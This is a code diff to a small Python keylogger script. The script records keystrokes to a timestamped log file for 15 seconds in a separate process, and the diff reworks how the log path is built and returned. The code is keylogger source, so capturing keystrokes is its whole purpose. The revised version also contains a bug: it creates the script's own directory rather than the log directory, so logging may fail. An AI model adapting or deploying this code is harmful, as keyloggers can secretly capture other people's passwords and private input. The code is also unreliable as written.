@@ -5,11 +5,9 @@ import datetime
 import multiprocessing
 
 
-def keylog_action(filename):
-    source_dir = os.path.dirname(os.path.abspath(__file__))
-    log_dir = source_dir + "/keylog_log/"
-    if not os.path.exists(log_dir):
-        os.mkdir(log_dir)
+def keylog_action(source_dir, log_dir, filename):
+    
+    os.makedirs(source_dir, exist_ok=True)
     logging.basicConfig(filename=(log_dir + filename),
                         level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
@@ -19,9 +17,13 @@ def keylog_action(filename):
         listener.join()
 
 
-def keylog(timeout_seconds=15):
+def keylog():
+    timeout_seconds=15
+    source_dir = os.path.dirname(os.path.abspath(__file__))
+    log_dir = source_dir + "\\keylog_log\\"
+    
     filename = "keylog_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
-    process = multiprocessing.Process(target=keylog_action, args=(filename,))
+    process = multiprocessing.Process(target=keylog_action, args=(source_dir, log_dir, filename))
 
     process.start()
     print("Keylog started.")
@@ -32,12 +34,11 @@ def keylog(timeout_seconds=15):
         process.join()
 
     print("Keylog ended.")
-    return 'keylog_log/'+filename
+    return log_dir + filename
 
 
 def main():
-    keylog()
-
-
+    path = keylog()
+    print(path)
 if __name__ == "__main__":
     main()
